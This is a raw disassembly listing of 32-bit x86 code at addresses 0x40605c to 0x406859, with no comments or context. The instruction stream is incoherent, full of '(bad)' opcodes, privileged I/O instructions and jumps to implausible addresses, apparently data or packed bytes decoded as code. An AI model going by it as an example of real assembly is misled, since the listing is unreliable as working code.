  40605c:	aam    0x78
  40605e:	push   ecx
  40605f:	sbb    al,cl
  406061:	sub    BYTE PTR [ebp-0x12956300],ah
  406067:	xchg   ebx,eax
  406068:	test   DWORD PTR [eax],0xfc152598
  40606e:	pop    ecx
  40606f:	enter  0xb22f,0x9d
  406073:	mov    ds:0x2d6b3e9b,eax
  406078:	cs ds leave 
  40607b:	clc    
  40607c:	stos   DWORD PTR es:[edi],eax
  40607d:	retf   0xac14
  406080:	mov    edx,0xfbca248d
  406085:	gs ss leave 
  406088:	leave  
  406089:	jecxz  0x406084
  40608b:	int    0xb3
  40608d:	aaa    
  40608e:	xchg   esi,eax
  40608f:	mov    dh,0xd2
  406091:	and    BYTE PTR ds:0xd350cd95,0x92
  406098:	push   esi
  406099:	call   0xff394e80
  40609e:	inc    ebx
  40609f:	in     eax,0x3f
  4060a1:	mov    al,ds:0x614b8a53
  4060a6:	rcr    cl,cl
  4060a8:	dec    edi
  4060a9:	pop    eax
  4060aa:	jge    0x4060b2
  4060ac:	stc    
  4060ad:	mov    WORD PTR [edi+0x3be94ea1],ds
  4060b3:	nop
  4060b4:	push   0xfffffff4
  4060b6:	jmp    0xb3eee552
  4060bb:	dec    ecx
  4060bc:	pop    edx
  4060bd:	clc    
  4060be:	iret   
  4060bf:	bound  ebx,QWORD PTR [eax-0x2b]
  4060c2:	and    esp,DWORD PTR [ebp-0x6b]
  4060c5:	sub    DWORD PTR [eax+0x6d8664be],esi
  4060cb:	push   esi
  4060cc:	or     eax,0xe96a55ad
  4060d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4060d2:	test   BYTE PTR ds:0xebbc9be,cl
  4060d8:	fld    QWORD PTR [ecx]
  4060da:	xchg   esp,eax
  4060db:	shr    dl,1
  4060dd:	inc    esp
  4060de:	push   ebx
  4060df:	mov    ds:0xf0343ca5,al
  4060e4:	fstp   QWORD PTR ds:0xb776f1a5
  4060ea:	push   ebx
  4060eb:	fidivr WORD PTR [edi-0xd478c17]
  4060f1:	imul   ecx,DWORD PTR [ebx],0xc1a7dfa5
  4060f7:	nop
  4060f8:	inc    ebp
  4060f9:	xchg   esi,eax
  4060fa:	inc    ecx
  4060fb:	out    dx,al
  4060fc:	dec    ebp
  4060fd:	sub    bl,bl
  4060ff:	ins    BYTE PTR es:[edi],dx
  406100:	shl    BYTE PTR [esi-0x1afc20be],cl
  406106:	jle    0x406181
  406108:	inc    eax
  406109:	mov    ebp,0xc30e71ac
  40610e:	cmc    
  40610f:	push   cs
  406110:	ror    DWORD PTR [esp+ebx*2+0x34],cl
  406114:	sti    
  406115:	div    DWORD PTR [edi+0x5b02486d]
  40611b:	and    BYTE PTR [ecx+0x24],dl
  40611e:	mov    dl,0x8c
  406120:	stc    
  406121:	xor    eax,0x26b21284
  406126:	sub    edx,DWORD PTR [ecx-0xc37821d]
  40612c:	jmp    0x61aa8e62
  406131:	lods   al,BYTE PTR ds:[esi]
  406132:	inc    ecx
  406133:	pop    esi
  406134:	jne    0x40616b
  406136:	hlt    
  406137:	mov    ?,WORD PTR [ecx+0x7c92fe12]
  40613d:	cmp    al,0xbe
  40613f:	(bad)  
  406140:	call   0x410a:0x13e9da9f
  406147:	sbb    DWORD PTR [ecx-0x5a],ecx
  40614a:	fs mov ecx,0x5d7d61e0
  406150:	add    BYTE PTR [eax-0x56fdf81a],al
  406156:	pop    ss
  406157:	pop    edx
  406158:	fmul   QWORD PTR [esi]
  40615a:	fistp  DWORD PTR [ebp-0x4c45036c]
  406160:	xchg   BYTE PTR [esi],cl
  406162:	inc    edx
  406163:	and    ebp,DWORD PTR [eax-0x770534d1]
  406169:	lahf   
  40616a:	jmp    0x8e1:0xb8bbfa5d
  406171:	repnz sub BYTE PTR [ebx+0x65b5a55e],0x5b
  406179:	and    al,0x4c
  40617b:	mov    dh,ch
  40617d:	mov    edx,0x8702c46f
  406182:	lods   eax,DWORD PTR ds:[esi]
  406183:	pop    ss
  406184:	push   0x858599be
  406189:	icebp  
  40618a:	dec    ebp
  40618b:	(bad)  
  40618c:	mov    ds:0xc107d767,eax
  406191:	aas    
  406192:	mov    esp,0x398e4ea3
  406197:	mov    gs,WORD PTR [ecx+0x4b]
  40619a:	mov    ds:0xe4d3c7ff,al
  40619f:	mov    ds:0x21fd97c9,al
  4061a4:	sbb    eax,0x55d37312
  4061a9:	sahf   
  4061aa:	cli    
  4061ab:	add    ch,BYTE PTR [ecx+0x15e2ccf8]
  4061b1:	or     ebp,DWORD PTR [ebx]
  4061b3:	in     al,dx
  4061b4:	outs   dx,BYTE PTR ds:[esi]
  4061b5:	mov    DWORD PTR [eax+0x2b],eax
  4061b8:	out    dx,al
  4061b9:	xchg   ecx,eax
  4061ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4061bb:	xor    BYTE PTR [ebx+edx*4-0x63fac51],dh
  4061c2:	sbb    ebp,eax
  4061c4:	not    BYTE PTR [edx-0x4bd89100]
  4061ca:	or     al,0x1c
  4061cc:	sub    DWORD PTR [esi+esi*1+0x1c2995ec],0xc07fa42c
  4061d7:	sub    cl,BYTE PTR gs:[edx-0x3e9a3640]
  4061de:	in     eax,dx
  4061df:	mov    eax,esp
  4061e1:	lds    edx,FWORD PTR [ecx]
  4061e3:	push   ecx
  4061e4:	mov    ds:0x6b2744a9,al
  4061e9:	imul   eax,DWORD PTR [edx+ebp*2],0xffffff83
  4061ed:	dec    eax
  4061ee:	mov    bh,0x48
  4061f0:	jne    0x4061bd
  4061f2:	or     cl,BYTE PTR [edx+0x7c]
  4061f5:	lods   eax,DWORD PTR ds:[esi]
  4061f6:	dec    BYTE PTR [edx]
  4061f8:	daa    
  4061f9:	inc    eax
  4061fa:	ins    BYTE PTR es:[edi],dx
  4061fb:	mov    al,ds:0x63566eab
  406200:	pop    esi
  406201:	mov    fs,WORD PTR [ecx-0x7f]
  406204:	sbb    BYTE PTR [ebp-0x1476abc3],bl
  40620a:	fsub   QWORD PTR [ebp+0x16]
  40620d:	mov    ecx,0x6303c424
  406212:	or     eax,0x1d9a1d16
  406217:	into   
  406218:	jb     0x40624d
  40621a:	sub    ebx,esi
  40621c:	mov    DWORD PTR [ecx+0x28d4f6a6],eax
  406222:	push   es
  406223:	lahf   
  406224:	int3   
  406225:	mov    ecx,0xb8f27ce0
  40622a:	inc    esi
  40622b:	jmp    0xdfdca61a
  406230:	pop    ebp
  406231:	adc    bh,BYTE PTR ss:[edi-0xf615a2c]
  406238:	cdq    
  406239:	ret    0x4b3d
  40623c:	dec    ecx
  40623d:	stos   DWORD PTR es:[edi],eax
  40623e:	mov    bl,0x36
  406240:	cmp    eax,0x3de54eaf
  406245:	sub    cl,ch
  406247:	(bad)  
  406248:	fnstenv [esi+0x7dc54e07]
  40624e:	push   eax
  40624f:	push   cs
  406250:	or     edi,DWORD PTR [edi]
  406252:	test   eax,0x25a6ec17
  406257:	cld    
  406258:	scas   eax,DWORD PTR es:[edi]
  406259:	sbb    DWORD PTR [edi-0x66],0xb124ca1f
  406260:	shl    BYTE PTR [edx-0x1d31444d],0x29
  406267:	hlt    
  406268:	mov    esp,DWORD PTR [edi-0x5d015d3c]
  40626e:	imul   BYTE PTR [edx-0x41a62804]
  406274:	rcl    DWORD PTR [esi],cl
  406276:	xor    BYTE PTR [edi-0xf3dbf9c],bl
  40627c:	mov    BYTE PTR [eax-0x4f3926f3],dl
  406282:	test   BYTE PTR [edi],al
  406284:	retf   
  406285:	ret    0x1d36
  406288:	jo     0x40623f
  40628a:	push   edi
  40628b:	arpl   si,dx
  40628d:	or     BYTE PTR [ebp-0x4d],dl
  406290:	ret    
  406291:	pop    es
  406292:	xchg   DWORD PTR [edx+0x5e],edx
  406295:	(bad)  
  406296:	je     0x4062f4
  406298:	fidivr DWORD PTR [esi-0x63]
  40629b:	pusha  
  40629c:	push   ds
  40629d:	and    ecx,DWORD PTR [edi]
  40629f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4062a0:	ss mov edx,0xb80f2373
  4062a6:	pop    es
  4062a7:	sub    edi,DWORD PTR [ebx+0x53]
  4062aa:	sub    eax,DWORD PTR [esi-0x62]
  4062ad:	ds push ecx
  4062af:	cld    
  4062b0:	js     0x406310
  4062b2:	xlat   BYTE PTR ds:[ebx]
  4062b3:	daa    
  4062b4:	cmp    esp,DWORD PTR [si+0x6cfa]
  4062b9:	iret   
  4062ba:	loop   0x4062bb
  4062bc:	ins    BYTE PTR es:[edi],dx
  4062bd:	ss sahf 
  4062bf:	xor    eax,0x45ff727d
  4062c4:	ja     0x406289
  4062c6:	(bad)  
  4062c7:	mov    ecx,0xc9c8aedb
  4062cc:	jnp    0x4062fa
  4062ce:	hlt    
  4062cf:	cld    
  4062d0:	imul   BYTE PTR [ebp+0x28]
  4062d3:	mov    esp,0xbc598218
  4062d8:	jb     0x4062a8
  4062da:	xchg   esi,eax
  4062db:	pop    es
  4062dc:	inc    ecx
  4062dd:	sub    dl,cl
  4062df:	xchg   BYTE PTR [edx],cl
  4062e1:	(bad)  
  4062e2:	cmp    DWORD PTR [ecx-0x740e0811],esp
  4062e8:	dec    ebp
  4062e9:	adc    cl,ch
  4062eb:	jmp    0x4062ef
  4062ed:	add    BYTE PTR [eax],al
  4062ef:	(bad)  
  4062f0:	aas    
  4062f1:	ret    0xc9c2
  4062f4:	rol    esi,0xcb
  4062f7:	sbb    DWORD PTR [ebp-0x64],0xcc50d85c
  4062fe:	mov    ds:0x7878c7de,eax
  406303:	dec    ebp
  406304:	jle    0x40637e
  406306:	js     0x4062e1
  406308:	cmp    DWORD PTR [edi-0x58041213],ecx
  40630e:	inc    ecx
  40630f:	push   eax
  406310:	retf   
  406311:	rol    DWORD PTR [eax+edx*1],1
  406314:	xchg   esp,eax
  406315:	cmp    bl,BYTE PTR [ebx+0x7c8d2540]
  40631b:	and    eax,0xb5c4c67f
  406320:	cdq    
  406321:	(bad)  
  406322:	mov    eax,0xae87b150
  406327:	cdq    
  406328:	call   0xb5bd:0xc3b0e5f8
  40632f:	addr16 push ds
  406331:	mov    dh,0xad
  406333:	xchg   ecx,esi
  406335:	(bad)  
  406336:	in     al,0xfa
  406338:	rcl    DWORD PTR [ecx-0xe],cl
  40633b:	push   esi
  40633c:	out    0x44,al
  40633e:	pop    esi
  40633f:	ror    edi,0xc5
  406342:	jo     0x4063ba
  406344:	cwde   
  406345:	sbb    al,0xa7
  406347:	push   ss
  406348:	fidivr DWORD PTR [esp+eax*4]
  40634b:	sub    bl,dl
  40634d:	imul   edi,esi,0xf14e964e
  406353:	xor    eax,0xc9cdcb46
  406358:	mov    eax,0x4dc42709
  40635d:	aas    
  40635e:	xchg   esi,eax
  40635f:	mov    al,ds:0xd98e68af
  406364:	test   esi,ebx
  406366:	jl     0x4063ac
  406368:	ja     0x40634a
  40636a:	es loop 0x406384
  40636d:	mov    edx,0x16418d
  406372:	mov    cl,0x81
  406374:	mov    BYTE PTR [edx+0x5e],dh
  406377:	clc    
  406378:	jge    0x4063c8
  40637a:	not    ebx
  40637c:	or     BYTE PTR [edi],ah
  40637e:	mov    bh,bl
  406380:	add    DWORD PTR [ebx],ebx
  406382:	mov    edi,0xf4155545
  406387:	fmul   st,st(7)
  406389:	jnp    0x4063cc
  40638b:	pop    ecx
  40638c:	rcr    DWORD PTR [edx],1
  40638e:	pop    ebx
  40638f:	or     bh,BYTE PTR [esi]
  406391:	test   BYTE PTR [ecx],0xae
  406394:	add    esi,esp
  406396:	inc    DWORD PTR [edx+ebx*2+0x61494cab]
  40639d:	je     0x40631f
  40639f:	dec    ebp
  4063a0:	fnstenv [ebp-0x243d59f9]
  4063a6:	mov    BYTE PTR [edx-0xc],0x6b
  4063aa:	call   0xbca264d9
  4063af:	mov    bh,0x87
  4063b1:	gs push edx
  4063b3:	sbb    eax,0xa11ab9f1
  4063b8:	or     eax,0x355ac1d1
  4063bd:	sahf   
  4063be:	and    ah,bh
  4063c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063c1:	jle    0x40634f
  4063c3:	test   eax,0x4b514c6a
  4063c8:	push   ebx
  4063c9:	call   0x327d:0xe4b56f58
  4063d0:	sbb    eax,0x158d0d6d
  4063d5:	sub    ecx,DWORD PTR [edi+edx*4]
  4063d8:	pop    eax
  4063d9:	pop    esi
  4063da:	push   ebp
  4063db:	dec    ecx
  4063dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063dd:	jnp    0x406361
  4063df:	(bad)  
  4063e0:	sbb    bh,dh
  4063e2:	sub    eax,0x813b7653
  4063e7:	inc    ebp
  4063e8:	cs scas al,BYTE PTR es:[edi]
  4063ea:	xor    al,0x5a
  4063ec:	dec    edi
  4063ed:	sbb    eax,0xc3cc3dcc
  4063f2:	out    0x4a,al
  4063f4:	(bad)  
  4063f5:	sti    
  4063f6:	adc    BYTE PTR [edi+eiz*8],bl
  4063f9:	jnp    0x40637b
  4063fb:	scas   al,BYTE PTR es:[edi]
  4063fc:	push   es
  4063fd:	in     eax,0xde
  4063ff:	loope  0x4063cb
  406401:	loop   0x4063be
  406403:	adc    ecx,0xda196c13
  406409:	inc    eax
  40640a:	ss pop ds
  40640c:	or     eax,0x397db845
  406411:	or     bh,BYTE PTR [esi+eax*4+0xc]
  406415:	cld    
  406416:	sub    DWORD PTR [ebx-0x77],ebp
  406419:	cmp    edi,DWORD PTR [ebx+0x491460cb]
  40641f:	mov    ebp,0x6f39a36d
  406424:	jecxz  0x40646e
  406426:	popf   
  406427:	pop    edi
  406428:	rol    dl,1
  40642a:	xor    cl,0xf2
  40642d:	mov    al,ds:0x316b0c1c
  406432:	js     0x4063cc
  406434:	pop    ecx
  406435:	pop    ebp
  406436:	(bad)  
  406437:	cld    
  406438:	cdq    
  406439:	dec    edx
  40643a:	cmp    ebx,DWORD PTR [ecx+0x57]
  40643d:	arpl   WORD PTR ds:0x8f77325d,di
  406443:	nop
  406444:	sar    dh,1
  406446:	jbe    0x40643e
  406448:	outs   dx,BYTE PTR ds:[esi]
  406449:	or     esi,edi
  40644b:	inc    ecx
  40644c:	jecxz  0x4063e3
  40644e:	xchg   ecx,eax
  40644f:	lds    eax,FWORD PTR [edi+0x22350eed]
  406455:	loopne 0x406416
  406457:	mov    WORD PTR [eax-0x12],gs
  40645a:	mov    al,ds:0x9f9305ff
  40645f:	mov    eax,0xc11f0994
  406464:	in     al,dx
  406465:	xor    cl,cl
  406467:	arpl   WORD PTR [ebx],sp
  406469:	lods   al,BYTE PTR ds:[esi]
  40646a:	mov    BYTE PTR [ebx-0xf],ch
  40646d:	sbb    BYTE PTR [edi-0x36],0xff
  406471:	clc    
  406472:	shl    BYTE PTR [ecx+0xe],0x2b
  406476:	mov    esi,0xab5ee012
  40647b:	pop    edx
  40647c:	lods   al,BYTE PTR ds:[esi]
  40647d:	sar    BYTE PTR [esi],cl
  40647f:	test   eax,0xf9db6dd6
  406484:	jle    0x40647a
  406486:	or     bl,dh
  406488:	dec    ebp
  406489:	xchg   ecx,eax
  40648a:	and    DWORD PTR [edx-0x76],ebx
  40648d:	pop    esi
  40648e:	jne    0x406436
  406490:	out    0x6f,eax
  406492:	mov    ds:0x33b54345,al
  406497:	(bad)  
  406498:	es mov edi,0x4c3ac01d
  40649e:	xchg   ebx,eax
  40649f:	and    eax,0xc6183565
  4064a4:	(bad)  
  4064a5:	push   ds
  4064a6:	ror    BYTE PTR [eax+0x5e],1
  4064a9:	imul   esi,DWORD PTR es:[ebp+0x44],0xffffffbe
  4064ae:	fwait
  4064af:	mov    eax,0xf8b4646f
  4064b4:	mov    DWORD PTR [edi-0x9ec7d90],edx
  4064ba:	adc    ch,BYTE PTR [ebx]
  4064bc:	sub    dl,cl
  4064be:	call   FWORD PTR [ecx]
  4064c0:	ficomp WORD PTR [esi]
  4064c2:	scas   eax,DWORD PTR es:[edi]
  4064c3:	out    0x3c,al
  4064c5:	adc    al,0xca
  4064c7:	fwait
  4064c8:	mov    ebx,edi
  4064ca:	daa    
  4064cb:	xchg   ecx,eax
  4064cc:	pop    edx
  4064cd:	adc    al,0xe7
  4064cf:	outs   dx,DWORD PTR ds:[esi]
  4064d0:	lahf   
  4064d1:	imul   edx,DWORD PTR [esi+0x7c],0x5b
  4064d5:	jl     0x406549
  4064d7:	dec    eax
  4064d8:	enter  0xd779,0x94
  4064dc:	in     al,0x1c
  4064de:	jge    0x406541
  4064e0:	mov    DWORD PTR [ebx-0x7d2d2622],ecx
  4064e6:	cli    
  4064e7:	fldcw  WORD PTR [esi]
  4064e9:	adc    BYTE PTR [ecx],ch
  4064eb:	cmp    DWORD PTR [ebx-0x71],esp
  4064ee:	and    eax,0x89fc79e2
  4064f3:	inc    eax
  4064f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4064f5:	jmp    0x40656d
  4064f7:	xor    BYTE PTR [edx],ah
  4064f9:	push   0x6e
  4064fb:	test   edx,esi
  4064fd:	or     ecx,DWORD PTR [edi+edi*4-0x42]
  406501:	ins    DWORD PTR es:[edi],dx
  406502:	mov    dl,0x96
  406504:	call   0x7476f673
  406509:	pop    ebp
  40650a:	push   0xffffffb9
  40650c:	xchg   BYTE PTR [edx-0x724180e0],ah
  406512:	dec    edi
  406513:	lock cmp al,0x5
  406516:	mov    ah,0x85
  406518:	fstp   TBYTE PTR [ebx-0x5e7d60be]
  40651e:	push   ebx
  40651f:	out    dx,al
  406520:	lods   al,BYTE PTR es:[esi]
  406522:	iret   
  406523:	inc    eax
  406524:	lea    ebx,[edi-0x1dcce755]
  40652a:	adc    cl,dl
  40652c:	sub    dl,al
  40652e:	dec    ebp
  40652f:	xor    edx,0xffffff92
  406532:	mov    ah,0x0
  406534:	dec    esi
  406535:	dec    BYTE PTR [eax+0x6d9fe262]
  40653b:	jnp    0x4065bb
  40653d:	daa    
  40653e:	scas   al,BYTE PTR es:[edi]
  40653f:	call   0x4b44:0x9d991ef1
  406546:	or     BYTE PTR [edi+eax*4-0x447c35cf],0xd8
  40654e:	push   ebp
  40654f:	addr16 out dx,eax
  406551:	rcr    BYTE PTR [ebp+0x1e],cl
  406554:	jmp    0x4064e0
  406556:	jle    0x406582
  406558:	mov    edi,0xa23c9d5b
  40655d:	dec    esp
  40655e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40655f:	inc    edx
  406560:	add    al,0x65
  406562:	imul   edi,DWORD PTR [edx+ebx*4],0x423ce503
  406569:	scas   al,BYTE PTR es:[edi]
  40656a:	or     DWORD PTR [edi+0x655e3683],esi
  406570:	popf   
  406571:	in     al,0xd8
  406573:	pop    es
  406574:	test   DWORD PTR [edi+0x7c],ebp
  406577:	pop    esi
  406578:	jmp    0x406577
  40657a:	and    dl,BYTE PTR [eax+0x56bc86e9]
  406580:	in     al,0xd7
  406582:	xor    al,0x8e
  406584:	loopne 0x4065c2
  406586:	jmp    0xd1c9c2fe
  40658b:	(bad)  
  40658c:	sahf   
  40658d:	sub    al,0xef
  40658f:	fs stos DWORD PTR es:[edi],eax
  406591:	rcr    ecx,cl
  406593:	(bad)  
  406594:	icebp  
  406595:	(bad)  
  406596:	xor    eax,0x8443b809
  40659b:	add    ebx,0x82a42043
  4065a1:	scas   al,BYTE PTR es:[edi]
  4065a2:	inc    ecx
  4065a3:	mov    eax,0x3c8b0125
  4065a8:	in     al,dx
  4065a9:	(bad)  [eax+0x6e7fb5da]
  4065af:	fld    TBYTE PTR [ebp-0x2a19aad8]
  4065b5:	js     0x406591
  4065b7:	fisub  WORD PTR [ecx+0x41]
  4065ba:	xlat   BYTE PTR ds:[ebx]
  4065bb:	push   cs
  4065bc:	sub    esp,DWORD PTR [ecx+0x2c]
  4065bf:	jno    0x40656d
  4065c1:	inc    ebp
  4065c2:	out    dx,eax
  4065c3:	inc    ecx
  4065c4:	mov    al,BYTE PTR [esi-0x26]
  4065c7:	push   ss
  4065c8:	mov    ebp,0xd62157a6
  4065cd:	dec    ecx
  4065ce:	pop    ebx
  4065cf:	je     0x4065bb
  4065d1:	push   0x446ac859
  4065d6:	push   edx
  4065d7:	jb     0x4065c3
  4065d9:	pop    ss
  4065da:	and    ecx,eax
  4065dc:	or     ecx,0x81161d8e
  4065e2:	mov    eax,ecx
  4065e4:	jmp    0x4068d4
  4065e9:	ds enter 0x3dcf,0xcd
  4065ee:	cmp    eax,0xabe7cfce
  4065f3:	mov    ch,cl
  4065f5:	sbb    DWORD PTR [ebx],eax
  4065f7:	push   edi
  4065f8:	imul   esi,DWORD PTR [ebx],0x4d7878c4
  4065fe:	jle    0x406678
  406600:	js     0x4065ca
  406602:	jno    0x4065f2
  406604:	or     eax,0xab445df8
  406609:	pop    edi
  40660a:	fdivr  DWORD PTR [eax]
  40660c:	ret    
  40660d:	ja     0x40660c
  40660f:	sub    eax,DWORD PTR [edi]
  406611:	mov    edx,0xdac9b247
  406616:	scas   eax,DWORD PTR es:[edi]
  406617:	and    ah,BYTE PTR [ebx]
  406619:	jae    0x4065dc
  40661b:	push   ds
  40661c:	loopne 0x40661f
  40661e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40661f:	sbb    eax,0xc2f82892
  406624:	sbb    BYTE PTR [ebx+eiz*2+0x3d],ah
  406628:	or     al,BYTE PTR [ebx-0x41]
  40662b:	gs aad 0xd8
  40662e:	jns    0x40667b
  406630:	adc    cl,bl
  406632:	dec    ecx
  406633:	dec    ebp
  406634:	nop
  406635:	cwde   
  406636:	ret    
  406637:	cmp    BYTE PTR [ebp-0x65f8802],bl
  40663d:	sbb    BYTE PTR [ebx-0x68028a3c],ch
  406643:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406644:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406645:	xor    al,0x4f
  406647:	push   ss
  406648:	pop    ss
  406649:	ret    
  40664a:	rcr    BYTE PTR [edx],cl
  40664c:	arpl   WORD PTR [edx+0x65],ax
  40664f:	hlt    
  406650:	mov    dl,0x19
  406652:	mov    edi,0x78cbbb5a
  406657:	fcomp  DWORD PTR [ebx]
  406659:	xor    BYTE PTR [edx+ecx*8],bl
  40665c:	add    ebx,esp
  40665e:	mov    edi,0xb7511544
  406663:	jne    0x40669a
  406665:	std    
  406666:	or     bl,BYTE PTR [edx+ebp*2-0x65]
  40666a:	loop   0x406608
  40666c:	retf   
  40666d:	inc    ecx
  40666e:	repz mov ah,0x58
  406671:	dec    DWORD PTR [eax-0x72]
  406674:	jnp    0x406628
  406676:	and    al,0x2b
  406678:	push   esi
  406679:	iret   
  40667a:	jp     0x406693
  40667c:	jmp    0x406659
  40667e:	mov    ss,WORD PTR [ebp+edx*8-0x75c85e1c]
  406685:	icebp  
  406686:	inc    eax
  406687:	dec    ebp
  406688:	enter  0xded1,0xc7
  40668c:	enter  0x5d46,0x27
  406690:	stc    
  406691:	(bad)  
  406692:	pop    ecx
  406693:	in     eax,dx
  406694:	jb     0x4066b9
  406696:	xchg   ecx,eax
  406697:	mov    ah,0x83
  406699:	aam    0x42
  40669b:	ret    0x4ff6
  40669e:	fwait
  40669f:	add    eax,0x8904f167
  4066a4:	pop    edx
  4066a5:	int    0x8a
  4066a7:	mov    ds:0xdd5a377,eax
  4066ac:	inc    esi
  4066ad:	jge    0x4066da
  4066af:	xor    al,0x21
  4066b1:	lods   eax,DWORD PTR ds:[esi]
  4066b2:	push   ds
  4066b3:	adc    cl,al
  4066b5:	jp     0x40670f
  4066b7:	inc    edx
  4066b8:	cmp    dh,bl
  4066ba:	int3   
  4066bb:	les    esi,FWORD PTR [edx-0x13]
  4066be:	rcr    DWORD PTR ds:0xd58bf7d9,0xaa
  4066c5:	mov    ds:0x8df77598,al
  4066ca:	rcl    BYTE PTR [edx],1
  4066cc:	les    eax,FWORD PTR [esi+edi*8-0x18e51dc3]
  4066d3:	lea    edi,[ebp+eiz*4-0x77]
  4066d7:	or     ch,BYTE PTR [ebp-0x4f]
  4066da:	scas   al,BYTE PTR es:[edi]
  4066db:	daa    
  4066dc:	test   eax,0x4013c78c
  4066e1:	addr16 inc ebp
  4066e3:	pusha  
  4066e4:	mov    ds:0xeb6d202a,eax
  4066e9:	lea    ebp,[edi+0x6723da95]
  4066ef:	sub    al,0x27
  4066f1:	jl     0x406750
  4066f3:	mov    cl,0xf
  4066f5:	mov    esi,0x43c78169
  4066fa:	mov    DWORD PTR [edi],0x20fa9f36
  406700:	test   esp,ebx
  406702:	push   esp
  406703:	out    dx,eax
  406704:	xchg   ebx,eax
  406705:	dec    edx
  406706:	lds    eax,FWORD PTR [ebx]
  406708:	jnp    0x406697
  40670a:	xchg   esp,eax
  40670b:	mov    cs,WORD PTR [ebx+ebp*2+0x2e]
  40670f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406710:	mov    al,BYTE PTR ds:0x9988
  406715:	in     eax,dx
  406716:	sub    bh,BYTE PTR ds:0xac436a66
  40671c:	ss popa 
  40671e:	retf   0x3a62
  406721:	ja     0x406740
  406723:	push   ecx
  406724:	or     eax,DWORD PTR [eax-0x3f]
  406727:	lods   al,BYTE PTR ds:[esi]
  406728:	leave  
  406729:	mov    esp,0x3f0e1340
  40672e:	cwde   
  40672f:	sub    eax,0xca1d975a
  406734:	mov    eax,DWORD PTR [edx+0x1993d61a]
  40673a:	mov    ?,WORD PTR [ecx-0x6c]
  40673d:	dec    esp
  40673e:	gs (bad) 
  406740:	fsubr  st,st(6)
  406742:	fnstsw WORD PTR [ebp-0x2e]
  406745:	dec    ebp
  406746:	xchg   ebp,eax
  406747:	bound  esi,QWORD PTR [ebx]
  406749:	imul   ebp,edi,0xffffff89
  40674c:	xchg   DWORD PTR [edi-0x5c],ebx
  40674f:	mov    ebp,0x70bc921b
  406754:	sbb    DWORD PTR [eax+0x6df5fa96],ecx
  40675a:	hlt    
  40675b:	lea    ebx,[ecx]
  40675d:	dec    eax
  40675e:	(bad)  [ecx]
  406760:	int3   
  406761:	sbb    esp,esi
  406763:	cmp    bh,ch
  406765:	xchg   ebp,eax
  406766:	jg     0x40671d
  406768:	jg     0x40675e
  40676a:	pop    eax
  40676b:	out    dx,al
  40676c:	pushf  
  40676d:	fild   DWORD PTR ss:[edi+ebx*1-0x15]
  406772:	mov    al,0x42
  406774:	pop    es
  406775:	test   eax,0x272bb60b
  40677a:	loop   0x4067f5
  40677c:	add    al,0x5c
  40677e:	xchg   ecx,eax
  40677f:	jns    0x4067aa
  406781:	or     bh,BYTE PTR [ecx-0xc]
  406784:	xchg   ecx,eax
  406785:	shr    ch,0xb3
  406788:	call   0x5d53c029
  40678d:	in     al,dx
  40678e:	jg     0x4067b9
  406790:	and    dh,al
  406792:	stos   DWORD PTR es:[edi],eax
  406793:	fmul   DWORD PTR [ecx+0x4d]
  406796:	mov    BYTE PTR [eax+0x70],cl
  406799:	retf   0xfc39
  40679c:	repnz add eax,edx
  40679f:	push   esp
  4067a0:	sbb    ah,BYTE PTR [eax+0x248e4fb1]
  4067a6:	and    ebp,DWORD PTR [eax+0x3e3b1fa5]
  4067ac:	pop    esp
  4067ad:	or     al,0x6
  4067af:	rol    DWORD PTR [ebx],cl
  4067b1:	or     ch,BYTE PTR [edi]
  4067b3:	(bad)  
  4067b4:	js     0x4067a1
  4067b6:	stc    
  4067b7:	repnz jmp 0x87a1:0x427d7649
  4067bf:	(bad)  
  4067c0:	dec    esi
  4067c2:	shl    BYTE PTR [ecx],0x45
  4067c5:	das    
  4067c6:	adc    cl,BYTE PTR [esi]
  4067c8:	push   edx
  4067c9:	or     DWORD PTR [edx+eax*8+0x5d8c73f9],ebp
  4067d0:	fidiv  WORD PTR [esi]
  4067d2:	jae    0x406819
  4067d4:	setb   bl
  4067d7:	loop   0x40681b
  4067d9:	and    dh,BYTE PTR [ecx]
  4067db:	push   cs
  4067dc:	push   edi
  4067dd:	mov    eax,0x9ff287e3
  4067e2:	or     DWORD PTR [esi+0xc8fe892],eax
  4067e8:	cwde   
  4067e9:	jmp    0xc0c5094f
  4067ee:	je     0x40685e
  4067f0:	jo     0x406802
  4067f2:	fsub   QWORD PTR [edx]
  4067f4:	and    edx,edx
  4067f6:	mov    esp,ds
  4067f8:	or     DWORD PTR [edx-0x4a5cf673],edi
  4067fe:	pop    ss
  4067ff:	mov    ss,WORD PTR [ebx-0x59397364]
  406805:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406806:	in     eax,dx
  406807:	push   ds
  406808:	das    
  406809:	xor    DWORD PTR [edx+0x7a2cdad2],ebp
  40680f:	std    
  406810:	retf   0xbd4f
  406813:	mov    ?,WORD PTR ds:0xacafd89c
  406819:	sahf   
  40681a:	xor    DWORD PTR [esi],ebx
  40681c:	es aam 0x6c
  40681f:	jne    0x40683e
  406821:	push   ds
  406822:	push   ecx
  406823:	jne    0x40682e
  406825:	dec    edx
  406826:	lods   al,BYTE PTR ds:[esi]
  406827:	cmp    BYTE PTR [eax],bh
  406829:	dec    esp
  40682a:	cmp    esp,esi
  40682c:	inc    edx
  40682d:	test   al,0x9a
  40682f:	je     0x40681a
  406831:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406832:	daa    
  406833:	stc    
  406834:	es dec ebx
  406836:	push   ds
  406837:	fisubr DWORD PTR [ebx]
  406839:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40683a:	js     0x406851
  40683c:	mov    al,BYTE PTR [edx+0x21c99f76]
  406842:	mov    ecx,esi
  406844:	mov    esp,0x74cd7708
  406849:	aas    
  40684a:	enter  0x5702,0x5e
  40684e:	scas   al,BYTE PTR es:[edi]
  40684f:	mov    ds:0x4fa3a491,eax
  406854:	mov    esp,0x3fc6c51a
  406859:	or     dh,BYTE PTR [ecx+edi*2-0x13c2910]
